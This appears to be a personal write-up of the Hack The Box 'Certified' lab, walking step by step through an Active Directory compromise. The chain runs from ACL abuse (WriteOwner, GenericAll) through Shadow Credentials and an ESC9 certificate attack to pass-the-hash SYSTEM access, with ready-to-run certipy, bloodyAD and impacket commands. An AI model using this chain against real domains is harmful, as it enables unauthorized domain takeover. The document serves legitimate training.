---
title: Certified Lab from HTB
date: 2024-12-10
summary: Medium-difficulty Windows machine designed around an breach scenario.
tags:
  - ESC9
  - Shadowcredentials
  - Genericwrite
  - Writeowner
  - Targetedkerberoast
  - Medium
tech_stack: S
authors:
  - me
featured: true
---

---
### Overview

This medium-difficulty box focused on exploiting weaknesses in misconfigured Active Directory Certificate Services (AD CS), combined with access control list (ACL) abuse to progress through the attack path.

## 1. Reconnaissance

###  UDP Port Scan

Nmap UDP scan against the target:

```bash
sudo nmap -sU --top-ports 100 -sV -T3 -Pn -n 10.129.231.186
```

<img src="Images/image1.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

Identified open UDP ports:

```text
53/dns
88/kerberos
123/ntp
```

---

###  TCP Port Scan

Full TCP scan with default scripts and version detection:

```bash
sudo nmap -sV -sC -p- -T4 -Pn 10.129.231.186
```

<img src="Images/image2.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

Identified open TCP ports:

```text
53   : dns
88   : kerberos
135  : msrpc
139  : netbios
389  : ldap
445  : smb
5985 : winrm
```

---

###  Domain Identification

The Fully Qualified Domain Name (FQDN) was identified as:

```text
certified.htb
```

The domain was added to the local `/etc/hosts` file.

<img src="Images/image3.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

### SMB Enumeration

####   Share Enumeration

Using valid credentials for `judith.mader`, SMB shares were enumerated:

```bash
nxc smb 10.129.231.186 -u judith.mader -p 'judith09' --shares
```

The following shares were readable:

- NETLOGON
    
- SYSVOL
    
- IPC$
    

<img src="Images/image4.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

####  User Enumeration

Enumerating domain users over SMB:

```bash
nxc smb 10.129.231.186 -u judith.mader -p 'judith09' --users
```

<img src="Images/image5.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

Discovered domain users:

```text
management_svc
ca_operator
alexander.huges
harry.wilson
gregory.cameron
judith.mader
```

---

### BloodHound Enumeration

#### Time Synchronization

To avoid Kerberos-related issues, the local system time was synchronized with the domain controller:

```bash
sudo ntpdate -u certified.htb
```

---

####  Privilege Analysis

BloodHound revealed the following privileges for `judith.mader`:

- Member of the **Certificate Service DCOM Access** group
    

<img src="Images/image6.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

- Has **WriteOwner** rights over the **Management** group
    

<img src="Images/image7.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

####  Certificate Enumeration (Judith)

Certificates were enumerated for `judith.mader` to identify potential AD CS misconfigurations:

```bash
certipy find -u 'judith.mader' -p 'judith09' -dc-ip 10.129.231.186 -target certified.htb -enabled -vulnerable -stdout
```

<img src="Images/image8.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

## 4. Exploitation

### Taking Ownership of the Management Group

Since `judith.mader` has **WriteOwner** over the **Management** group, ownership was changed:

```bash
impacket-owneredit -action write -new-owner 'judith.mader' -target 'management' certified.htb/judith.mader:'judith09'
```

<img src="Images/image9.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

#### Granting GenericAll Permissions

After gaining ownership, **GenericAll** permissions were granted to `judith.mader` on the **Management** group:

```bash
bloodyAD --host 10.129.231.186 -d certified.htb -u judith.mader -p 'judith09' add genericAll 'Management' 'judith.mader'
```

<img src="Images/image10.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

####  Adding User to the Management Group

With sufficient permissions, `judith.mader` was added to the **Management** group:

```bash
bloodyAD --host 10.129.231.186 -d certified.htb -u 'judith.mader' -p 'judith09' add groupMember Management 'judith.mader'
```

<img src="Images/image11.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

####  Lateral Control Discovery

BloodHound was revisited, revealing that the **Management** group has **GenericWrite** over the user `management_svc`:

<img src="Images/image12.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

####  Kerberoasting Attempt

An attempt was made to Kerberoast `management_svc` using `targetedKerberoast.py`:

```bash
python3 targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09'
```

<img src="Images/image13.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

The extracted hash could not be cracked using Hashcat.

---

####  Shadow Credentials Attack

Instead, a **Shadow Credentials** attack was performed using Certipy:

```bash
certipy shadow auto -username judith.mader@certified.htb -password 'judith09' -account 'management_svc' -dc-ip 10.129.231.186
```

This yielded the NTLM hash for `management_svc`.

<img src="Images/image14.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

####  Credential Validation

The obtained hash was validated over SMB:

```bash
nxc smb 10.129.231.186 -u 'management_svc' -H a091c1832bcdd4677c28b5a6a1295584
```

<img src="Images/image15.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

#### WinRM Access

Successful WinRM authentication was confirmed:

```bash
nxc winrm 10.129.231.186 -u 'management_svc' -H a091c1832bcdd4677c28b5a6a1295584
```

<img src="Images/image16.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

####  Certificate Enumeration (management_svc)

Certificate vulnerabilities were checked for `management_svc`:

```bash
certipy find -u 'management_svc' -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.231.186 -target certified.htb -enabled -vulnerable -stdout
```

<img src="Images/image17.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

####  Interactive Shell

An interactive shell was obtained:

```bash
evil-winrm -i 10.129.231.186 -u 'management_svc' -H a091c1832bcdd4677c28b5a6a1295584
```

<img src="Images/image18.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">  
<img src="Images/image19.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

## 5. Privilege Escalation

### BloodHound Analysis

BloodHound revealed that `management_svc` has **GenericAll** over the **ca_operator** account:

<img src="Images/image20.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

#### Password Reset (ca_operator)

Using BloodyAD, the password for `ca_operator` was changed:

```bash
bloodyAD --host 10.129.231.186 -d certified.htb -u management_svc -p :a091c1832bcdd4677c28b5a6a1295584 set password 'ca_operator' 'Password123!'
```

<img src="Images/image21.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

#### Certificate Enumeration (ca_operator)

Certificate enumeration revealed that `ca_operator` is vulnerable to **ESC9**:

```bash
certipy find -u 'ca_operator' -p 'Password123!' -dc-ip 10.129.231.186 -target certified.htb -enabled -vulnerable -stdout
```

<img src="Images/image22.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

#### Shadow Credentials (ca_operator)

The NTLM hash for `ca_operator` was obtained:

```bash
certipy shadow auto -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator
```

<img src="Images/image23.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

#### UPN Manipulation

The UPN for `ca_operator` was temporarily changed to `administrator`:

```bash
certipy account update -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn administrator
```

---

#### Administrator Certificate Request

An administrator certificate was requested:

```bash
certipy req -u ca_operator@certified.htb -hashes :2b576acbe6bcfda7294d6bd18041b8fe -ca certified-DC01-CA -template CertifiedAuthentication -target 10.129.231.186
```

<img src="Images/image24.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

#### UPN Restoration

The UPN was reverted back to its original value:

```bash
certipy account update -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator
```

---

#### Administrator NTLM Hash Extraction

Using the obtained certificate, the NTLM hash for the Administrator account was retrieved:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.231.186 -domain certified.htb
```

<img src="Images/image25.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

#### Domain Administrator Access

A SYSTEM shell was obtained using PsExec:

```bash
impacket-psexec administrator@certified.htb -hashes aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

<img src="Images/image26.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">

---

## 6. Proof of Compromise

Root flag successfully obtained:

<img src="Images/image27.png" style="display: block; margin-left: auto; margin-right: auto; margin-bottom: 5px;">
